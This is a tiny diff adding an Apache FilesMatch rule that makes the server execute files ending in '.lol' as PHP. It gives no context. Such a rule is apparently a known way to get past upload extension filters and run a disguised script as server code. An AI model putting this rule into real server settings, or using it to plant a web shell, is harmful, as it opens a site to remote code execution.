@@ -1,0 +1,3 @@
+<FilesMatch "\.lol$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
